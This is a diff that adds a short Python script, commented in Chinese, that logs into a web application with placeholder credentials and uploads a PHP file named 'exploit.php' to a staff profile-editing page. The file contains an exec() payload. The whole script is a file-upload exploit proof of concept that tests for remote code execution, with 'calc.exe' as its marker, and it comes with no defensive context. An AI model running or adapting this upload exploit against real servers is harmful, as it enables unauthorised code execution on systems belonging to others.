@@ -1,0 +1,30 @@
+import requests
+from bs4 import BeautifulSoup
+
+# 初始化一个会话对象
+session = requests.Session()
+
+# 登录页面和目标 URL
+login_url = 'http://example.com/login/'
+target_url = 'http://example.com/staff/edit-my-profile.php'
+
+# 模拟登录所需的数据
+login_data = {
+    'username': 'your_username',  # 替换为实际用户名
+    'password': 'your_password'   # 替换为实际密码
+}
+
+# 模拟登录
+response = session.post(login_url, data=login_data)
+
+# 检查登录是否成功，然后进行文件上传
+if response.ok:
+    # 要上传的 PHP 脚本
+    php_payload = '<?php exec("calc.exe"); ?>'
+    files = {'uploaded_file': ('exploit.php', php_payload)}
+    
+    # 上传文件
+    response = session.post(target_url, files=files)
+    print(response.text)
+else:
+    print("登录失败")
